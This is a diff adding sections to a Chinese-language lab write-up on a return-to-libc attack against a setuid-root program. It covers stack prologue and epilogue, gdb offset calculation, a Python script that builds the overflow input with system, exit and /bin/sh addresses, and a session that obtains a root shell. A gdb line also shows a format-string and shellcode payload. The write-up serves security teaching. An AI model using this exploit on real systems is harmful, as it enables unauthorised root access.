@@ -41,6 +41,31 @@ sudo chown root stack
 sudo chmod 4755 stack
 ```
 
+#### 函数的序言和后记
+**序言**  
+![](/software-security/img/return-to-libc-2.png)
+序言通常包含三条指令  
+```
+pushl %ebp //保存ebp的值(它目前指向调用者的帧栈)  
+movl %esp, %ebp  //让ebp指向被调用者的帧栈
+subl $N, %esp //为局部变量预留空间
+```
+a.当一个函数被调用时，返回地址(在函数调用前，计算机把新函数调用前的下一条指令的地址)被call指令压力栈中。因此在函数执行序言之前，栈指针esp是指向了返回地址  
+b.将调用者的帧指针(称为前帧指针)存入栈中。当函数返回时，调用者的帧指针可以被恢复  
+c.把esp赋值给ebp当作当前函数的栈底  
+b.栈指针esp移动N个字节为函数的局部变量预留时间  
+
+
+**后记**  
+![](/software-security/img/return-to-libc-3.png)
+```
+movl %ebp, %esp  //释放为局部变量开辟的栈空间
+popl %ebp  //让ebp指回调用者函数的帧栈
+ret // 返回
+```
+b.把esp移动到帧指针指向的位置，即释放了序言时为局部变量开辟的栈空间  
+c.把前帧指针重新赋值给ebp，恢复调用者函数的帧指针  
+d.ret冲栈中弹出返回地址并跳转到该地址。  
 
 #### 发起攻击
 为了通过system运行`/bin/sh`需要完成三个步骤  
@@ -89,7 +114,37 @@ Breakpoint 1, main (argc=1, argv=0xbffff6a4) at stack.c:16
 ...
 
 ```
-`0xbfffffe9:	"/home/ubuntu/stack"`在环境变量入栈前，程序的文件名会先被压入栈，因此程序名的长度会影响环境变量的地址
+`0xbfffffe9:	"/home/ubuntu/stack"`在环境变量入栈前，程序的文件名会先被压入栈，因此程序名的长度会影响环境变量的地址  
+
+因为知道了程序的名字会影响环境变量的地址，所以下面答应地址的程序env33保持和stack的长度一直都是5个字母长度  
+
+```
+// env33.c 
+#include <stdio.h>
+#include <stdlib.h>
+
+int main()
+{
+    char *shell = (char *)getenv("SHANSHELL");
+    if (shell)
+    {
+        printf(" Value: %s \n", shell);
+        printf(" Address: %x\n", (unsigned int)shell);
+    }
+    return 1;
+}
+```
+
+```
+ubuntu@VM-0-17-ubuntu:~$ gcc -o env33 env33.c 
+ubuntu@VM-0-17-ubuntu:~$ .env33
+.env33: command not found
+ubuntu@VM-0-17-ubuntu:~$ ./env33
+ Value: /bin/sh 
+ Address: bfffffcc
+```
+参数`/bin/sh`的地址为：0xbfffffcc  
+
 
 
 **3.system函数的参数**  
@@ -99,22 +154,79 @@ Breakpoint 1, main (argc=1, argv=0xbffff6a4) at stack.c:16
 
 首先需要知道进入system函数后ebp的确切位置。通过ebp知道了返回地址是 ebp+4， 参数是 ebp+8 ,所以需要把字符串/bin/sh的地址放到比ebp高8字节的位置。 那么system函数后ebp是多少呢？
 
-![](/software-security/img/buffer2.png)  
 
-在了解内存布局的时候，我们知道了，在进入一个函数帧栈的时候，会把上一个帧栈指针压入栈，然后把esp的值赋给ebp当作新的栈底。在进入system函数之前esp是指在返回地址上的，一旦程序跳转到system()中，它的函数序言将被执行，导致esp下移4个字节，并且ebp被设置成esp的当前值。
-
+![](/software-security/img/return-to-libc-4.png)
 
 
+![](/software-security/img/buffer2.png)
 
 
-
-
+通过上图可以知道，一旦跳转到system()函数，函数序言执行，esp下移4个字节，ebp被设置为esp的当前值。通过函数的内存布局可以知道，ebp+4的地方是返回地址(可以在返回地址上放入exit()函数完美终止程序)，ebp+8就是参数的地址。所以现在只需要通过esp来计算出参数的地址  
 
 
 
+**4.通过gdb调试出上面图(a)中ebp到buffer的距离**  
+```
+ubuntu@VM-0-17-ubuntu:~$ gdb -q stack
+Reading symbols from stack...done.
+(gdb) b foo
+Breakpoint 1 at 0x80484c1: file stack.c, line 7.
+(gdb) run
+Starting program: /home/ubuntu/stack 
+
+Breakpoint 1, foo (
+    str=0xbffff47c "^\365\377\277@@@@\\\365\377\277%.49139x%17$hn%.13829x%19$hn", '\220' <repeats 128 times>, "\061\300\061۰\325̀1\300Ph//shh/bin\211\343PS\211ᙰ\v̀") at stack.c:7
+7	    strcpy(buffer, str);
+(gdb) p $ebp
+$1 = (void *) 0xbffff458
+(gdb) p &buffer
+$2 = (char (*)[100]) 0xbffff3ec
+(gdb) p/d 0xbffff458 - 0xbffff3ec
+$3 = 108
+```
+ebp到foo函数中buffer的距离是108字节。因此计算如下：  
+foo函数的返回地址system()函数的地址是 108 + 4  
+system()函数的返回地址exit()函数的地址是 108 + 4 + 4 (通过上面图片看出整个过程后，system()函数的ebp比foo()函数的ebp高了4个字节，所以多+4)  
+system参数/bin/sh的地址是 108 + 4 + 8  
 
 
 
+#### 构建输入
+libc_exploit.py
+```
+# 给content填上非零值
+content = bytearray(0xaa for i in range(300))
 
+a3 = 0xbfffffd7     # /bin/sh的地址
+content[120:124] = (a3).to_bytes(4, byteorder='little')
 
+a2 = 0xb7e489e0     # exit函数地址
+content[116:120] = (a2).to_bytes(4, byteorder='little')
+
+a1 = 0xb7e54db0     # system函数地址
+content[112:116] = (a1).to_bytes(4, byteorder='little')
+
+file = open("badfile", "wb")
+file.write(content)
+file.close()
+```
+
+#### 发起攻击
+```
+ubuntu@VM-0-17-ubuntu:~$ ./stack
+$ id
+uid=500(ubuntu) gid=500(ubuntu) groups=500(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),115(lpadmin),116(sambashare)
+```
+攻击成功，进入sh，但是不是root权限。  
+这是因为ubuntu16.04中/bin/sh实际是一个指向/bin/dash的，它实现了一个保护机制，所以可以使用安装zsh代替/bin/sh试验  
+```
+ubuntu@VM-0-17-ubuntu:~$ sudo ln -s /bin/zsh /bin/sh                     
+ln: failed to create symbolic link '/bin/sh': File exists
+ubuntu@VM-0-17-ubuntu:~$ sudo rm /bin/sh
+ubuntu@VM-0-17-ubuntu:~$ sudo ln -s /bin/zsh /bin/sh
+ubuntu@VM-0-17-ubuntu:~$ ./stack                    
+# id
+uid=500(ubuntu) gid=500(ubuntu) euid=0(root) groups=500(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),115(lpadmin),116(sambashare)
+
+```
 
